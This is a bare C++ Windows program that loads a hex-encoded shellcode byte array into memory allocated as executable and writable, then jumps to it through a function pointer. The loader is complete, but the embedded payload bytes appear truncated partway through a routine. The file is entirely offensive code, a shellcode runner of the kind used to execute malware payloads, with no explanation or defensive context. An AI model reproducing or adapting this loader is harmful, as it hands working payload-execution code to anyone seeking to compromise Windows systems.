#include <windows.h>
#include <iostream>
int main() {
    unsigned char shellcode[] = "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
        "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
        "\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
        "\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac";

    void* exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    memcpy(exec, shellcode, sizeof(shellcode));
    void(*func)();
    func = (void(*)())exec;
    func();
    VirtualFree(exec, 0, MEM_RELEASE);
    return 0;
}
